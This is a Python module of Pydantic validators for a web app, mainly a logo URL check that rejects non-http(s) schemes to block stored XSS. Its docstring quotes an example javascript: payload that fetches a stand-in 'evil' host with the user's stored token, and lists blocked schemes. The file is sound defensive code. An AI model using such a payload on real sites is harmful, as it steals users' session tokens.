"""Shared Pydantic validators.

Kept out of `schemas/common.py` so route modules that already import from
`common` don't grow a second concern, and so unit tests can import the
validation function without dragging in every request/response model.
"""
from __future__ import annotations

from typing import Annotated, Optional
from urllib.parse import urlparse

from pydantic import AfterValidator


# Max length for logo URLs; mirrors the `organizations.logo_url` column
# (String(2000)) in the DB so over-length input fails at the edge.
MAX_LOGO_URL_LENGTH = 2000

_ALLOWED_LOGO_SCHEMES = frozenset({"http", "https"})


def _validate_logo_url(v: Optional[str]) -> Optional[str]:
    """Validate and normalise an organisation logo URL.

    Frontend renders `org.logo_url` into `<a href>` and `<img src>` (see
    `frontend/src/pages/SettingsPage.jsx`), so any non-http(s) scheme is a
    stored-XSS vector. An ORG_ADMIN with the ability to PATCH their org
    logo could otherwise set `javascript:fetch('//evil/'+localStorage.sah_token)`
    and steal every member's JWT the moment they open Settings.

    Rules:
    - ``None`` is allowed (the DB column is nullable).
    - Empty / whitespace-only strings are normalised to ``None`` so the
      existing "pass '' to clear" UX keeps working.
    - Otherwise the value must parse as an http:// or https:// URL with a
      non-empty host component, and must fit within MAX_LOGO_URL_LENGTH.
    - Every other scheme (javascript, data, vbscript, file, about, mailto,
      tel, ftp, blob, …) is rejected with a clear error.
    """
    if v is None:
        return None
    if not isinstance(v, str):
        # Pydantic would usually stop this at the type-coercion step, but
        # keep a defensive branch in case a subclass hands us something odd.
        raise TypeError("logo_url must be a string or null")

    trimmed = v.strip()
    if not trimmed:
        return None

    if len(trimmed) > MAX_LOGO_URL_LENGTH:
        raise ValueError(
            f"logo_url is too long (max {MAX_LOGO_URL_LENGTH} characters)"
        )

    parsed = urlparse(trimmed)
    scheme = (parsed.scheme or "").lower()
    if scheme not in _ALLOWED_LOGO_SCHEMES:
        # The error message intentionally does NOT echo the full value back —
        # a hostile input should not be reflected into the response body.
        raise ValueError(
            "logo_url must start with http:// or https:// "
            f"(got scheme={scheme!r})"
        )
    if not parsed.netloc:
        raise ValueError("logo_url is missing a hostname")

    return trimmed


# Annotated alias for use in request models. Any field typed as `LogoUrl`
# gets validation + normalisation for free.
LogoUrl = Annotated[Optional[str], AfterValidator(_validate_logo_url)]


__all__ = ["LogoUrl", "MAX_LOGO_URL_LENGTH", "_validate_logo_url"]
